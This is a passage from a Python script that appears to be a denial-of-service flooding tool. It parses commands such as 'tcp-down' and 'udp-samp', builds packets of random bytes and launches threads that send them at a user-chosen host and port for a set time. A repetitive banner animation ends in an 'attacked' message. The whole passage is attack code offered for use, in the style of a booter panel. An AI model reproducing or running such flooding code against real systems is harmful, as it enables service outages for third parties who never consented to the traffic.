                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "tcp-down":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 10949
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()

        elif sinput == "udp-samp":
            try:
                if running >= 9000000:
                    print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
                    main()
                else:
                    sinput, host, timer, port = sin.split(" ")
                    socket.gethostbyname(host)
                    pack = 81539
                    punch = random._urandom(int(pack))
                    threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
                    os.system("clear")
                    print(start)
                    time.sleep(1)
                    os.system("clear")
                    print(start2)
                    time.sleep(1)
                    os.system("clear")
                    print(start3)
                    time.sleep(1)
                    os.system("clear")
                    print(start4)
                    time.sleep(1)
                    os.system("clear")
                    print(start5)
                    time.sleep(1)
                    os.system("clear")
                    print(start6)
                    time.sleep(1)
                    os.system("clear")
                    print(start7)
                    time.sleep(1)
                    os.system("clear")
                    print(start8)
                    time.sleep(1)
                    os.system("clear")
                    print(start9)
                    time.sleep(1)
                    os.system("clear")
                    print(start10)
                    time.sleep(1)                    
                    print(attacked)

            except ValueError:
                main()
            except socket.gaierror:
                main()


try:
    clear = "clear"
    os.system("clear")
    print(banner)
    main()
except KeyboardInterrupt:
    exit()
